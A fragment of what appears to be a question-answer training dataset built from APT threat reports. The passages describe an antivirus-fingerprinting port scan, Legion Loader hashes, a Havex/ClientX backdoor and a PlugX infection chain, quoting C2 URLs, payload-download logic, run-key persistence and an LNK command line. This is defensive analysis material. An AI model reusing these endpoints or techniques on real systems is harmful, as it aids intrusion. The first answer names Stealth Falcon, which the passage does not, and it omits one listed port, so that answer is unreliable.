SYNs, and received three corresponding RST/ACKs (or timeouts).\nWhen testing with a TCP connection from Windows to a remote host, we can clearly see that Windows transmits the second SYN ~500ms after the first RST/ACK, and the third SYN ~500ms after the second RST/ACK.\nThus, the readyState value for a request to a closed port on 127.0.0.1 will not be set equal to 4 until approximately 1000ms after the request is issued. In summary, one can use this technique to distinguish between a closed port (readyState set to 4 at around 1000ms), an open port (readyState set to 4 before 1000ms), and a filtered port (readyState set to 4 long after 1000ms).\nThis script was apparently designed to detect the presence of certain components of Avast, Avira, ESET, Kaspersky, and Trend Micro antivirus products. We were not able to determine which program the probing of port 24961 was designed to detect. We verified that the latest version of Avast can be detected by this script, as it opens TCP port 12993, which is associated with its Mail Shield component for scanning email traffic; port 6999 is opened by Trend Micro's tmproxy which33 scans web and email traffic; port 1110 is used by Kaspersky34 to scan web and email traffic; it appears that Avira's Web Protection component for scanning web traffic used to open port 44080,35 though we observed it opening 44081 instead; port 30606 appears to have been used by ESET to scan web and email traffic,36 but we did not observe this port open while testing the latest version of ESET; port 6646 may be used by McAfee, though we did not test this. 37\nThe code for the port scanning appears to be adapted from the JS-Recon port scanning tool. JS-Recon is a generic tool that38 enumerates all open ports on 127.0.0.1 in a range; it does not specifically target anti-virus programs. The scan_xhr and check_ps_xhr functions in the aax.me profiling script are similar to the scan_ports_xhr and check_ps_xhr functions in JS-Recon. The creator of JS-Recon seems to have first presented the tool at BlackHat Abu Dhabi in 2010. 39\nNote that this technique can be generalized to any remote content timing side channel (e.g, the onerror event for an Image). Additionally, one can identify the presence of an open port on 127.0.0.1 that speaks HTTP without using timing information, and thus without the Windows TCP behavior assumption (e.g., by handling the onerror and oncomplete events of certain types of link elements).\nWe are unsure whether the purpose of the antivirus profiling is to identify potentially exploitable antivirus software running on a target's computer, or for evasion of antivirus products. In December 2015, Google Security discovered a critical vulnerability in Avast's antivirus product, which involved a webpage sending HTTP requests to a port that Avast opens on 127.0.0.1. Google Security demonstrated that the vulnerability allowed exfiltration of arbitrary files from a victim's disk. In41 January 2016, Google Security discovered a critical vulnerability in Trend Micro's antivirus product, which similarly involved a web page sending HTTP requests to a port that Trend Micro opens on 127.0.0.1. Google Security demonstrated that the vulnerability allowed arbitrary command execution.\nRead the text above and answer this question: What specific ports does the Stealth Falcon APT group probe to detect the presence of various antivirus products, and what antivirus components are associated with these ports?",
    "output": "The Stealth Falcon APT group probes the following ports to detect the presence of antivirus products: 12993 (Avast Mail Shield for email traffic), 44080 (Avira Web Protection for web traffic), 24961 (unknown), 1110 (Kaspersky for web and email traffic), 6646 (possibly McAfee), 30606 (ESET for web and email traffic). These ports are associated with specific components of the respective antivirus products that handle tasks such as scanning email and web traffic.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Dropped Samples (SHA256)\n056a2eb3925ea9a3933ed5c8e1b482eae5a098f013b1af751ec9b956edca12e1 0bae194c23b5fe3d73ccdf8267287c6e8fb66ed17cbdcce36c0da7583e8e6b49\n0ce45db58b6f12dc8cfc4d9d94e0ed8f596a9175a804b24817f8b8f24d1ea72e 0ce93f4cb43f21920d1fc0b04122327cc12838ba909d70f58bb58fcc661482c8 0e22f00c71588b2cc1206a01ae11e5cccc70a2cef7d00317be9bd97c73249a3f 0e355775044e0618395724e91820f979fd792149a5c993b74db02d3ca27f18cb 0f12ea3082491a32a67086f12657fcb48d740cab22a568b25eb16635ceb4b9a9 10084850b03a65bc94899e41680e6207ab71c6b96a7bf65f6086fbba41cc7b5c 14494be156326c7c7ca62b7cdf60317e01792136d9fc0c83247a7ee2eeab6c00 1725a07286362ca6cb164b0f297bc4cea0c567d13b477c069ed3cea190e89090 1875678d1097f47c742b09428f570f65a834d1f81e06e336535bfa62633e562c 1c74add22536cd48afd35130b5c8e2904af5485aa0ee46aa9af9cb1793ab3bf4 1e0ca8506a8c6dece660e3508463cb2b4b7609bb8c42307a9ad6605ed5aec62f 2a4108922238e45a94bb7a16fd40db1f5b590ed9ba2f777eb67787488eecb1d7 2a4c9b7f6b74a6bbe80663c9fadb63f31a558ff396a174b75830547657e24dfb 2ddea6aac519844a3c3ea6faaca267b67cbc853b8708a9523d9aedab0e2086b4 3078f6416fb334304ad456b97bc7b2322cc3e9419f4dbbc7d0dd2a6c98be0061 30ee0ef8b2f6820f9a2bfd6622a80c9fa22a9a185a3e453c9393fa9eeaa117be 319fb28bdad36a09e693cc97649670c3fbd39df1cfec4ee20385e23092a97e4c 3a46bc6ba261a1404db05fceec9989912120ad68ecf1b1886134070f94e2246f 3f987e48220a80724d1de41d4bfb1d365ab9986a700f49e8acc7b4d53f5e6471 482c26795c473fd28033bd1009e8315c3df4edb3266742e890b928836e6f08e6 4c09f6650da6686ca72c43e998fbbd2ab0387f666345a0ca40910bf53d0d9927 4c5d3081981d5400f18cecc96489dabb987b8390c36b4ebc447b5cac37bb1a88 4f523cbbce05aaf69ca59aabb554125f9c8dbb44c95d715679516160c949fc23 4f71844ecf1f290983515abb75804e6a6615a37536acbd10f267679feecaa9fd\n562e50801d7359bd5348a9b1d38f325cadb9ab9e298ff89c62e2d999ff826ce5 615626311e5585ca29b9d589fd213e8e1195f9c99c073e5aaf2bda6eeeb896f7 6532098adf0a7e43c46db0cb417a6e319b71764f613821b14ff247c9fb2efee7 69965fc0fb3884998567ec5e1693da58243248d44f9f8db6f11382566c6cd42f 70b636f7d49610856bf6abadb156697bd5e362da4962540133e88586e935c471 7709bb0c90a9cd174687ccf0911ed2ffeee18de4d9b78510a7530034b9141db9 793737c570e27b085ddbcd28c87d22b4ae0d3a6d092357705793cdf9678016cf 7ab3bb1e2783b8ddbb5581cde1cfb97fdf2c105ed0063a08abe2c2255d703315 811bded1035e8073b23470dd3d77ca85385a594a46dabc5892bb878e7148a0ac 84f6be18bb40cb9a3f08186e200492858b3265070629f917aa30d22ae125a712 8b763d5245d522987d5fba368b610147b7b602b0219fc31b6f3a5c90b37c173e 8ff13ca75a4d04587eebf32b66becfe90280690407d00c19eb7aaddc249f83cf 928cea1bc5bf99b0650c2f57133694d017f32c2337ad1fe50688bb3245041659 955ff926d734df2b9c7dd300fcdca0f3f2117b2d82719066a3c06041639c9c03 a153db1039abdc3c53db64939cde3b3da2fc6b04cdb5e02de67ef7ab837e5aac aa2b785cc249d4e41f5133cefbdb3da5484e63a18090fcc70da09dc5f1c7119b abdf3e9c36603953185d9ae75eef134941ab5c2e8407194cfe785cb95e254424 acc572e60a1b438236ed6eed53f1a173e47ca74841f43af30320e6282060dd0a adb47a69e4be076b7c625062fd33ed4d239ce9d5e38f233a6bb5c9b234121458 b165dce18dd17ead4984c506bb9d2861b4ac07775d6223735802e7b372211f80 b198bbc48a4a8bb2d8a393db390e31b317a7b1637215bc9e8e2c2ef2d23bd12f b79a4f6154e462de4de7c78373520d54388c0324d12e3c93dd50d637127efe35 b8db44f047337d9352ea04d6e4029c8817a6b5fc96c3b109e9522d615bc6580e bb39a5762493cd07009fe7495f33099df3d350f484cc0e8242ebdc173a0cf3a9\nbcfb71a0fbebf4dc471e4e4de8a2326eee4cc2676e307a1eb4e0e9f3d254c2ee c6469fa0c5fcdddb53409ac98eca5a315d8230c7dd074437d61c9008d76e7d67 cbca8246cdf5bedad9bf98414211f26b1f46bbfbacd108b52cdb4f1a1a2d1cea cd9fd3eae8fa647d3c10734702e7c8aa812c0ec1e95fb9d54e1dd3900f24be97 d21ebbcbd03f3bd1b185a6d933e6865a63914aacdeed3304610f5180cf9014b2 d3e9a49b228f3f873b95990fac665279b75e17bbf7288c2d5e3d114240d96209 dcf61acaebeac3b4751fbcbc946524cbe709cdfed1b67fe7c4421e889296171d e27a5fe1c99fd2cd91fa0154fbbce0ff0c5d2de363038a839089054b2934dab4 e5372c3eeed59074c6346702c45b8ace7299a42ccce7cb7791b00f9fc8c4ca36 e71579ea4b6f003d359db2c53c224514aec83a70b61a5d3648a7647e4b3d2b81 eb33d6e5f19ae156e179a05382e42c7a5f576cbf73d27edf586d80412c241629 ee0a4e00992382159296ee165789910fc41b1bfebd702a724e783300e72ba027 f1ac98b76aec34e05930c0fe80c89c38edf3cd34657ed17bc414a6dbbd6553c3 f3674f3a2a9e24fba71e0c4db02d150128983d2199c62f3d43e7d2cf3186da93 f8a69b36bd8df897f9cf9895f77b57a98233b5a6819b26ea579efc63dd403a9f faa351658d25453883b47cc1aa6b7e530a375649155a73ed75073fb0b5edb120 fc19702f1749dc163c927d6f2016a71a867f66eb33a77f36beb566366c08c775 ff888f5eeb702d37e899c1d2d5c4b273edcc3e4e35bf8226014f4022fc9121a8\n\nIn the context of the 'Dropped Samples (SHA256)' section from the Deep Instinct report on Legion Loader, how does the variety and quantity of malware samples indicate the nature of the attack campaign? Why might this be significant for cybersecurity experts in understanding and mitigating similar threats?",
    "output": "The variety and quantity of malware samples listed in the 'Dropped Samples (SHA256)' section indicate that the campaign involves multiple types of malware, including info-stealers, backdoors, a file-less cryptocurrency stealer, and occasionally a crypto-miner. This diversity is uncommon and suggests a 'dropper-for-hire' campaign where the dropper is designed to deliver various payloads. This is significant for cybersecurity experts because it highlights the complexity and sophistication of the attack, requiring a multi-faceted defense strategy. Understanding the variety of threats can help experts prioritize defenses, implement comprehensive detection mechanisms, and prepare for potential follow-up attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Code flow:\n\u2022 Check / create mutex \"(6757)\"\n\u2022 Check if it's run by ddex.exe or explorer.exe; if not, create remote thread in explorer.exe memory, which loads %TEMP%\\Low\\~tmppnet.dll\n\u2022 Set the autorun value:\nHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\nLoad=\"%TEMP%\\Low\\ddex.exe\"\n\u2022 Create a remote thread in explorer.exe, which loads %TEMP%\\Low\\ddex.exe\n\u2022 Get some data from first <br> tag after UTC string in the file returned by www.thetimenow.com/\nindex.cgi/?loc=258\n\u2022 Get systime and write it to %TEMP%\\Low\\~ntp.tmp\n\u2022 Get windows version\n\u2022 Look for malicious data by sending following request to the specified URLs: http://kitexgarments.com/ext/index2.php?t=%s&o=%s&i=%s&task_id=%s http://creloaded.com/ext/index2.php?t=%s&o=%s&i=%s&task_id=%s http://10bestsearch.com/ext/index2.php?t=%s&o=%s&i=%s&task_id=%s\n[t = base64 encoded time string / o = os version / i = data from thetimenow.com or NULL / task_id = content of ~task.tmp or string \"done\"]\nExample request:\n/ext/index2.php/?t=MjAxNDEyNzE0NQ==&o=XP_SP3&i=&task_id=done\nHost information at the time of analysis:\nkitexgarments.com\nresolves to 66.39.134.254,\nalive\nGET request to specified file returns \"<XAML></XAML>\"\ncreloaded.com\nresolves to 174.37.240.18,\nalive,\nGET request to specified file returns 404\n10bestsearch.com\nresolves to 195.16.89.46,\nalive,\nGET request to specified file returns 404\nHeaders:\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.3\n(KHTML, like Gecko) Chrome/6.0.472.59 Safari/534.3\nAccept: text/xml\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: no\nConnection: Keep-Alive\n\u2022 If the string \"<XAML></XAML>\" is in the returned HTML code, exit; otherwise:\n\u2022 Read content that is between tags <I6></I6> and write it to the file %TEMP%\\Low\\~task. tmp\n\u2022 Read content that is between tags <B6></B6>, xor it with 0x0A and write it to the %TEMP%\\ Low\\~ldXXXX.TMP file, then load this file to the memory\nV. Appendix 5:\nThe ClientX backdoor \u2013 detailed analysis\nThe ClientX backdoor binaries were found in an open directory on one of the C2 servers. They consist of two .NET files. One of them is called client.exe, which is the main malware component. The second is library.dll, which provides functions to client.exe.\nCompiled on: Mon Mar 04 13:23:46 2013\nFile size: 81 920 bytes\nSHA256: D449AEDACCA27E61B8FAE3FCF0E40C29C53ED565E23ED64B6F5528287B547BD2\nThe client.exe file has built-in debug messages, but the binary was compiled as a GUI application. By editing the PE header, it is possible to change it back to console, and see real time debug messages as the malware operates:\nHere is what is displayed upon execution:\nSleep 10 seconds\nOne instance\nupd cleaner\nupd cleaner done\nmain loop\nsettingcheck\nRegIeDir\nRegIeDir done\nrun-work\nLM no error\nLM no error\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\nrun-work done\nwork\nrun-work done 2\nBOTID\nsettingcheck done\u00ba\nANSWER\n0\nConnecting get : http://hajaj-center.com/moon/fancybox/fancy_source.php?id=BOTID\nbegin work\nend work\nLOOP END\nCode flow:\nUpon execution, client.exe starts by sleeping for 10 seconds. It then creates a Mutext called \"clientX\" to check whether other instances of the malware are already running. If no other instance of the malware is found, it will write \"One instance\" and continue execution. Otherwise, it will print out \"More than one instance\" and terminate.\nImmediately after creating the Mutex the \"cleaner\" method is called. (Debug message: \"upd cleaner\"). This method looks for all executables in the current folder and deletes files with names that do not match some file property criteria.\nThis is used to delete older versions of the RAT after a successful update (See the commands UPD later described in this appendix)\n5.1. Main loop\nThe backdoor then starts the main loop, which is an infinite while loop. (Debug message: \"main loop\").\n5.1.1 Setting check\nSome settings are checked by the backdoor. (Debug message: \"setting check\")\nThe Settings Check method from the check class is used.\n5.1.2 RegIeDir\nAfter the debug message \"RegIeDir\", the following registry key is opened \"HKEY_CURRENT_USER\\\\ SOFTWARE\\\\Microsoft\\\\Internet Explorer\" and the subkey \"InternetRegistry\" is checked. If not found, a subkey is created. That part is closed by a debug message: \"RegIeDir done\".\n5.1.3  Run-work\nThe \"run-work\" debug message indicates that the malware is gathering two registry keys for later use. There is a structure named \"prSettings\" with the following fields:\npublic struct prSettings\n{\npublic string[] servers;\npublic string id;\npublic int timeout;\npublic string pub;\npublic string priv;\npublic RegistryKey KeyRun;\npublic RegistryKey KeyWork;\n}\nThe last two fields \"prSettings.KeyRun\" and \"prSettings.KeyWork\" are the one filled by \"run-work\".\n\"KeyRun\" will hold \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", either from \"HKEY_LOCAL_MACHINE\" or \"HKEY_CURRENT_USER\" depending on access rights.\n\"KeyWork\" will hold \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\", either from \"HKEY_ LOCAL_MACHINE\" or \"HKEY_CURRENT_USER\" depending on access rights.\nThe \"CheckAccessLM\" and \"CheckAccessCU\" methods check for access to Local Machine and Current User, respectively.\nIf the LOCAL MACHINE isn't accessible the following error message is displayed \"LM error: error reason\", otherwise \"LM no error\".\nIf the CURRENT MACHINE isn't accessible the following error message is displayed \"CU error: error reason\", otherwise \"CU no error\".\nIf for some reason, neither \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\" from Local Machine nor Current User is accessible, the following\n\"HKEY_CURRENT_USER\\\\SOFTWARE\\\\Microsoft\\\\Internet Explorer\\\\InternetRegistry\" will be used for \"KeyWork\".\nOnce the registry keys are identified, the debug message \"run-work done\" is displayed.\nThe malware prints both KeyRun and Keywork and continues execution.\nA subkey is added to KeyRun to automatically start the malware when Windows reboots.\nThe name of that subkey comes from the \"version information\" entry of the resource section where the internal and original file name can be found.\nThe full path of the malware is set and the malware can now survive reboot. The debug message \"work\" is displayed.\n5.1.4 Run-work done 2\nThe next step focuses on the Keywork registry key.\nThe following subkeys are checked and created if not present in Keywork\\\\[name_from_version_ information] :  \"done\", \"doneEXT\", \"work\", \"settings\" and \"servers\".\nThey hold not any value at this point. This part is ended by a debug message: \"run-work done 2\"\n5.1.5 Generating BotID and filling subkeys\nImmediately after checking for special subkeys, the IDget method is called. If the \"id\" subkey doesn't exist, the method IDset is called and a new BOTID is created and stored as a Base64 encoded string.\nAfterwards, the IDget method is called and the BOTID is Base64 decoded from the registry and saved for later use in prSettings.id.\nIt does the same for \"prSettings.priv\", \"prSettings.pub\" , \"prSettings.timeout\" and \"prSettings. servers\", each time checking whether a value is already set, and creating one if not.\nThe developers made a mistake. The \"prSettings.priv\" is set using the IDget method instead of the KeyPrivGet method. However, this makes little difference since KeyPubGet, KeyPrivGet and IDget are wrappers to the GenerateID methods. This could have introduced a serious flaw if those parameters were used in a secure scheme:\nCorrect for Pub:\nif (this.KeyPubGet(prSettings.KeyWork) == null)\nthis.KeyPubSet(prSettings.KeyWork);\nprSettings.pub = this.KeyPubGet(prSettings.KeyWork);\nIncorrect for Priv:\nif (this.KeyPrivGet(prSettings.KeyWork) == null)\nthis.KeyPrivSet(prSettings.KeyWork);\nprSettings.priv = this.IDget(prSettings.KeyWork);  <--- mistake\nOnce it is done filling the prSettings structure, the debug message \"settingcheck done\" is displayed.\n5.2 Network communication - AnsSend\nThe next method called by our trojan is \"AnsSend\". It stands for \"Answer Send\". It starts with the debug message \"ANSWER\".\nThis part of the code looks into the registry, specifically into the \"KeyWork\\\\[name_from_version_ information]\\\\done\" and doneEXT subkeys to see if there is anything ready to be posted to the C&C server. Those subkeys should be empty at this stage, since the Answers are only created after a task received from the C&C server is completed.\nShould answers be available, their numbers would be printed as a debug message and processed and the following would be displayed as a debug message:\nANSWER\n1 (meaning one answer)\nConnecting post: HTTP:\\\\C&C server with botID as parameter\n8 (size of answer * 2 as it is converted to unicode)\nreqstream\nwrote to stream\nThis essentially does a POST request to the C&C server using the BOTID and the following User Agent: \"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0\" On the C&C server side, a new file would be created named after the BOTID with the extension \".ans\".\nHere is an example of such a file:\nThe date of the post can be found, the base64 encoded C&C server and the unicode string Answer, modified in this example.\nThis is how the attackers get an answer (result) from a given task.\n5.3 Network communication - WorkReceive\nThe WorkReceive function essentially does a GET request on the C&C server in order to receive a task to complete on the infected computer. The task to execute is encrypted and base64 encoded\nand returned between the \"havex\" tags. Here is an example without any task between the tags:\nThe trojan calls the DataParser to locate the task:\nThe task is decrypted, decoded and stored in the \"KeyWork\\\\[name_from_version_information]\\\\ work\" subkey.\n5.4 WorkBegin - Task Dispatcher\nJust before the WorkBegin method is called, the \"begin work\" debug message is displayed. The first thing WorkBegin does is decrypt and unbase64 the answer returned from the DataParser.\n\nBased on the above text, answer a question. Explain the role of the 'run-work' debug message in the ClientX backdoor\u2019s code flow. What specific actions does the malware take during this phase?",
    "output": "The 'run-work' debug message indicates that the malware is gathering two registry keys for later use: 'KeyRun' and 'KeyWork'. These keys are used to store the paths for automatic startup and working directories, respectively. During this phase, the malware checks access rights to determine whether to use HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER. If neither is accessible, it defaults to 'HKEY_CURRENT_USER\\\\SOFTWARE\\\\Microsoft\\\\Internet Explorer\\\\InternetRegistry'. This phase is essential for setting up the environment necessary for the malware to operate effectively.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: First Stage: PlugX Malware Delivered by ISO Image\nIn the first stage of the infection chain, EclecticIQ researchers assess that the malware was almost certainly delivered by a malicious email with an ISO image attachment. The ISO image contains a shortcut (LNK) file, but it decoyed as a DOC file called \"draft letter to European Commission RUSSIAN OIL PRICE CAP sg de.doc\".\nThe malicious LNK file contains a command line argument that can be executed by user execution to start the PlugX malware execution chain.\nThe command line argument of \"draft letter to European Commission RUSSIAN OIL PRICE CAP sg de.doc\" is shown below:\nC:\\Windows\\System32\\cmd.exe /q /c \"System Volume Information\\ \\test2022.ucp\"\nThe test2022.ucp portion of the command line argument is a renamed legitimate software which is originally called LMIGuardianSvc.exe. This executable is abused to perform DLL hijacking and to load the initial PlugX loader called LMIGuardianDll.dll. The legitimate and malicious executables are placed on the same file path (System Volume Information) to perform DLL Hijacking.\nMedium Headline: Second Stage: DLL Hijacking Execution Chain to Load PlugX Malware\nWhen a victim clicks on the shortcut file, it executes the command line argument mentioned in first stage, which is a technique called DLL hijacking (after the execution of LMIGuardianSvc.exe, it loads LMIGuardianDll.dll aka PlugX loader automatically). Upon execution of the PlugX loader a Microsoft Office Word document opens. The document is named \"draft letter to European Commission RUSSIAN OIL PRICE CAP sg de.docx\". This is a decoy document to trick the user into thinking there is no malicious activity.\nOne example of the Word document can be seen in the image below:\nThe process tree below shows the execution of the legitimate application LMIGuardianSvc.exe, which is executed twice under a new directory (\\AppData\\Roaming\\SamsungDriver) created by the malware and used for persistence access on infected device.\nEncrypted shellcode named LMIGuardianDat.dat contains PlugX malware:\nThe PlugX Malware loader decrypts and loads the encrypted shellcode (LMIGuardianDat.dat) inside the LMIGuardianSvc.exe. Injected memory space can be extracted to perform further analysis of decrypted PlugX Malware.\nLMIGuardianDLL.dll (PlugX Loader) decrypts the LMIGuardianDAT.dat and loads it in memory of the legitimate process.\nDuring static analysis, EclecticIQ analysts identified that the PlugX malware loader used a simple XOR algorithm to decrypt the LMIGuardianDAT.dat (XOR encrypted PlugX shellcode) to avoid signature-based detection from antimalware solutions.\nPlugX loader used a static XOR key \"0x47F\", to decrypt the PlugX shellcode. The below image shows a Python script being used to decrypt the LMIGuardianDAT.dat.\nOnce the PlugX malware has been executed in-memory, the C2 config is decrypted. The C2 IP address 217[.]12[.]206[.]116 and the campaign ID of \"test2022\" are seen in the figures below:\nMedium Headline: Third Stage: Registry Run Key Persistence\nMustang Panda abuses Windows registry run keys to gain persistence on the infected system. On Windows operating systems the run registry keys execute the specified program when a user logs on to the device.\nThe PlugX malware created a new run key called as LMIGuardian Update, shown in the image below.\nEvery logon will cause the Windows registry run key to execute the LMIGuardianSvc.exe, triggering the DLL Hijacking that leads to PlugX malware execution.\nThe malware creates a new file path which is being used by the persistence mechanism (Run key) to execute the LMIGuardianSvc.exe on this specific file path:\nMedium Headline: Fourth Stage: Command and Control Connection\nAfter a successful execution of PlugX malware, it connects to a remote C2 server which is used to send commands to compromised systems via the PlugX malware and to receive exfiltrated data from a target network.\nOnce the device is infected, an attacker can remotely execute several kinds of commands on the affected system. 'Sec-Dest' and 'Sec-Site' HTTP sections contain encrypted data of victim machine information sent to attackers.\nThe C2 IP address 217[.]12[.]206[.]116 was seen hosting another service on port 8088 with a unique SSL certificate that is itself issued to the IP address 45[.]134[.]83[.]29, which is identified as additional Mustang Panda's infrastructure, according to the BlackBerry Research & Intelligence Team [1].\nBig Headline: Conclusion\nEclecticIQ analysts assess it is almost certain the APT group Musta Panda was responsible for this attack. Mustang Panda has leveraged PlugX malware in previous campaigns targeting the Ukraine and has used similar TTPs like DLL hijacking. The group previously used Windows shortcut (LNK) files disguised using double extensions (such as .doc.lnk) with a Microsoft Word icon and has abused registry run keys for persistence. The SSL certificated used in this attack overlaps with previous Mustang Panda activity targeting the Ukraine.\nEclecticIQ analysts assess it is probable the target for this lure document was a European entity. The phishing lure used in the campaign discusses the effect EU sanctions against Russia will have on the European Union. Mustang Panda has targeted European organizations before in a similar campaign in 2022-10-26 [Figure 19]. Mustang Panda APT group continues to be a highly active threat group conducting cyber operations targeting organizations across Europe [2]. EclecticIQ analysts have\nidentified Mustang Panda operators adding new evasion techniques, like using a custom malware loader to execute an encrypted PlugX sample for the purpose of increasing infection rates and staying under the radar while performing cyber espionage activates against victims.\nEclecticIQ analysts assess that it is probable Mustang Panda will increase their activity and continue to use similar TTPs in response to geopolitical developments in Ukraine and Europe, based on an examination of the group's previous cyberespionage activity. Analysts should continue to track Mustang Panda using the TTPs and infrastructure highlighted in the report and the YARA rules provided below.\nBig Headline: Mitigations\nImplement basic incident response and detection deployments and controls like network IDS, netflow collection, host-logging, and web proxy, alongside human monitoring of detection sources.\nEmploy host-based controls.\nFilter email correspondence and monitor for malicious attachments.\nIdentify critical data and implement additional network segmentation and special protections for sensitive information, such as multifactor authentication, highly restricted access, and storage systems only accessible via an internal network.\nCreate alerts for disk image file types, such as ISO, and shortcut files, which have been increasingly abused by different threat actors. Furthermore, organizations should consider disabling auto-mounting of ISO or VHD files.\nConfigure intrusion detection systems (IDS), intrusion prevention systems (IPS), or any network defence mechanisms in place to alert on and upon review, consider blocking connection attempts from unrecognized external IP addresses and domains.\n\nQ: What encryption method does the PlugX malware loader use to decrypt the shellcode, and how does this help in evading detection?",
    "output": "A: The PlugX malware loader uses a simple XOR algorithm with a static XOR key (0x47F) to decrypt the LMIGuardianDAT.dat file, which contains the encrypted shellcode. This method helps in evading detection by signature-based antimalware solutions because the encrypted shellcode does not match known malware signatures. By decrypting the shellcode in memory, the malware can execute its payload without leaving easily detectable artifacts on the disk.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: A COMPLICATED LANDSCAPE\nBeyond the particulars of an investigation or the cunning of a given actor, attribution suffers from a variety of complications ranging through varying external motivators, inherent limitations, and methodological disparities across vendors and research teams. This merits a more high-level discussion of conditions complicating attribution in targeted attacks. The intended takeaway is that attributory analysis is far from straightforward, largely hermeneutic, and in no way a standard practice at this time.\nSmall Headline: Your sexiest attribution, please\nThe private threat intelligence production landscape involves various intertwined forces that arise from an interplay between private industry, private and public consumers, and public attention. Various motivations arise within this interplay, most\nnotably that of the value of media attention and free PR, which has proven a notable motivator for the rise of threat intelligence production in the anti-malware industry. While some TI teams have arisen out of the need for in-house elite researchers to deal with sophisticated attacks, many have followed from the realization that TI products garner heavy media attention with inherent marketing value. Judgment for this tactic is dampened by recognition of its value in motivating the awareness and adoption of the need for mature threat intelligence in an industry where even corporate giants and leaders in technology products have been less than willing to devote even meagre resources to tackle a complex, demanding, and ever-evolving problem.\nHowever, as is often the case with easy value-added ventures, abuse is quick to follow, as immature threat intelligence producers (often never-before-seen start-ups) have taken the stage with bombastic, absurd, and unverifiable attribution claims for the sake of headline stories that bring their companies to momentary prominence. These stories will serve as an excuse to approach or even extort potential victims-cum-customers whose dismayed IT teams are forced to spend precious limited resources chasing down nebulous leads for the sake of due diligence to reassure an anxious C-suite of the continued integrity of their systems, reputation and intellectual property. These tactics have borne ephemeral fruit not only with claims of sophisticated attacks but also presumed breaches, larger-than-life credential dumps, and ghost botnets.\nThis is not the only case where an eager but sometimes technically na\u00efve media machine is abused to the detriment of the threat intelligence production landscape. In an effort to foster a sense of balanced debate, media outlets have entertained any sign of contention in the research community, lending credence to doubt even where there is little ambiguity and breeding a class of pundits charitably referred to as professional cyber-truthers, who have built careers on the basis of sparsely substantiated contrarian attributory claims. While legitimate disagreement in the research community should not be diminished, we should also acknowledge the prevalence of sniping between competing vendors, the anti-anti-malware peanut gallery, and other skeptics eager to disparage popular research at face value.\nIn response, larger outfits are increasingly adopting a closed-door approach to the distribution of threat intelligence products, or the partial withholding of signifi cant details intended solely for paying customers \u2013 an approach with obvious benefits and latitude for expression, but one that's also prone to validation issues as the value of the research product cannot be verified by qualified third parties14. On the off-chance that a given vendor's products prove dubious or inconsequential for a single-source consumer, this can lead to an erosion of trust in threat intelligence as a whole.\nMedium Headline: The one-eyed man is king\nThe very nature of threat intelligence results from a fascinating injection of third-party observers into the dynamic between an attacker and victim, often by chance. This serendipitous\ninterplay may be the result of a contractual placement of defence solutions in the victim's network, the maintenance of service infrastructure (as in the case of ISPs and webmail, cloud or storage providers), or by stumbling upon attack artifacts found on multi-scanners, staging servers, or through their foolishly wide distribution, in the case of hamfi sted attackers.\n14 Discussed as a validation crisis likely to arise in threat intelligence [29].\nThe implicit takeaway is that the position of the threat intelligence producer will shape the nature of the research by virtue of limited visibility. All possible producers inevitably suffer from varying degrees of limited visibility. This often means that two different similarly positioned companies possess different incomplete parts of the same operation, that endpoint security companies see payloads with no network traffi c, that ISPs see network traffic and victimology but no payloads, and so on. To then claim perfect awareness over a given campaign will prove short-sighted folly, given that little deters the same actors from continuing their efforts, often retooling and targeting the same victims. Failures become apparent as alternate reports contain vaguely overlapping IOCs that showcase the incompleteness of a single-source report and extended campaigns against a given victim may abuse previously unseen attacker capabilities possibly witnessed by other vendors.\nMedium Headline: Analyst training\nAn often ignored facet of the threat intelligence production cycle is the role of the analyst whose purpose is to coalesce various sources of information, arrive at various conclusions, and vet the overall logic of the finished product. Sadly, at this stage in the rise of the threat intelligence industry, deficient hiring practices overemphasize specialized technical knowledge and eschew generalist broad-thinking capabilities, often assuming technical candidates will bring these in tow. This is seldom the case, as showcased by talented malware reverse engineers who don't consider themselves 'threat hunters', as well as by outlets promulgating technical malware breakdowns who fail to identify the connection of these artifacts with larger campaigns.\nThreat intelligence analysts often suffer from defi cient training in conventional intelligence analysis. Industry forums and conferences are heavily populated with trainings and ample resources aimed at fostering skills such as reverse engineering and 'threat hunting' that are essential to the production process, but among these little is exclusively aimed at fostering the broad-thinking methodologies necessary to turn technical indicators and victimology into a reliable estimative and actionable consumable product. Many military and intelligence metaphors and models are suggested at this stage but these are still reliant on the ability of the analyst to weigh different possibilities and scenarios, keeping excitement for a given theory at bay, and allowing for accurate estimative language to make its way to the fi nal recipient.\nIn simpler terms, it's necessary to state that a hunch is a hunch, that some conclusions are sparsely sourced or cannot be independently arrived at, or that no conclusion can be made at this time. There exist a handful of exemplary threat intelligence veterans whose familiarity with previous operations allows them to express high accuracy intuitions that speak to the provenance\nof targeted attacks; the remainder of us mere mortals must be able to follow the logical foundations of a theory to arrive at an accurate action plan that can independently be sustained by the consuming IT and IR teams.\n\nHow does the private threat intelligence production landscape influence the quality and reliability of attribution claims?",
    "output": "The private threat intelligence production landscape involves various intertwined forces arising from interactions between private industry, consumers, and public attention. The value of media attention and free PR has significantly motivated the rise of threat intelligence production, leading to both positive and negative outcomes. While some threat intelligence (TI) teams have emerged to handle sophisticated attacks, others have capitalized on the media attention to gain prominence, often making bombastic and unverifiable attribution claims. This has led to the proliferation of immature TI producers who make exaggerated claims to attract attention, causing unnecessary panic and resource wastage among potential victims. Additionally, the media's tendency to entertain any sign of contention in the research community has given rise to professional cyber-truthers who cast doubt on legitimate research, further complicating the landscape.",
    "category": "apt-notes",
